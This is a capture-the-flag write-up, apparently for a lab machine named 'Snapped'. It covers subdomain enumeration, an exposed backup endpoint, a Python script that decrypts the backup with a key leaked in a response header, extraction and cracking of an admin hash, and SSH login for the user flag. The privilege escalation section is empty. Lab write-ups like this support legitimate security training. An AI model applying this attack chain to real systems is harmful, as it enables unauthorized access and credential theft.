# Snapped

## Recon 
I begin by enumerating with FFUF and finding the ``admin.snapped.com`` domain, I go to it and look through the network tab to find possible API endpoints 
<img width="1855" height="937" alt="Screenshot From 2026-10-08 16-31-51" src="https://github.com/user-attachments/assets/0354ac1f-de1a-413a-ba98-002cdc73006f" />
After curling with api endpoint ``install`` for a bit I get curious based on known vulnerable NGINX architecture I test for ``api/backup`` and get a hit. 
<img width="1056" height="448" alt="Screenshot From 2026-10-08 16-43-58" src="https://github.com/user-attachments/assets/be94c7ea-95ee-46e0-bebf-41cafc0f092c" />

## Initial Access 
I download the zip file with X-Backup-Security value saved to attempt to decrypt. 
<img width="1346" height="111" alt="Screenshot From 2026-10-08 16-33-45" src="https://github.com/user-attachments/assets/64087274-4785-482d-b20b-4937e6a3cf93" />
In order to do this, I create a simple python script, 
```python3
import base64
import requests
import zipfile
import io 
from Crypto.Cipher import AES

url = "http://admin.snapped.htb/api/backup"
print("[*] Requesting backup and active keys...")
response = requests.get(url, stream=True)

# 1. Isolate the custom session security header
security_header = response.headers.get("X-Backup-Security")
if not security_header:
    print("[-] Failed to locate X-Backup-Security header.")
    exit(1)

print(f"[+] Found Header: {security_header}")
key_b64, iv_b64 = security_header.split(":")


# 2. Decode the dynamic strings into binary formats
key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)
try: 
    outer_zip= zipfile.ZipFile(io.BytesIO(response.content))
# 3. Read the clean raw binary body stream
    encrypted_data = outer_zip.read("nginx-ui.zip")
except Exception as e:
    print(f"Failed to read outer zip contents: {e}")
    exit(1)
# 4. Decrypt via AES-CBC mode without standard PKCS7 constraints
print("[*] Decrypting payload stream...")
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_data = cipher.decrypt(encrypted_data)
decrypted_data = decrypted_data.rstrip(b"\x00")

# 5. Save the valid archive
output_file = "clean_backup.zip"
with open(output_file, "wb") as f:
    f.write(decrypted_data)

print(f"[+] Success! Valid archive written to: {output_file}")
```
Creating and running the script gave me the ability to unzip the encrypted folder, where a valuable ``database.db`` sits. 
<img width="1022" height="370" alt="Screenshot From 2026-10-08 17-08-04" src="https://github.com/user-attachments/assets/77a2dff0-8260-435b-9add-9c9104b39f27" />
We simply log in using sqllite3 and select all entries from users
<img width="960" height="283" alt="Screenshot From 2026-10-08 17-26-26" src="https://github.com/user-attachments/assets/4edd7a31-e467-4234-9a83-7a28daff042e" />
<br>

Which gives us the admin hash;
<img width="1920" height="125" alt="Screenshot From 2026-10-08 17-26-53" src="https://github.com/user-attachments/assets/e481811b-aae2-45ff-838c-578ec325e2ae" />

Comparing this against rockyou.txt gives us a respectable password; ``linkinpark``

Signing in to SSH as johnathan, we test the newly found password and obtain the user flag,
<img width="955" height="43" alt="image" src="https://github.com/user-attachments/assets/83f67e6e-4b38-4653-ad57-4dec11560d84" />
<img width="378" height="61" alt="image" src="https://github.com/user-attachments/assets/4de4508a-f8a8-4ede-a1cc-2d1da1e5a643" />

## Privilege Escalation
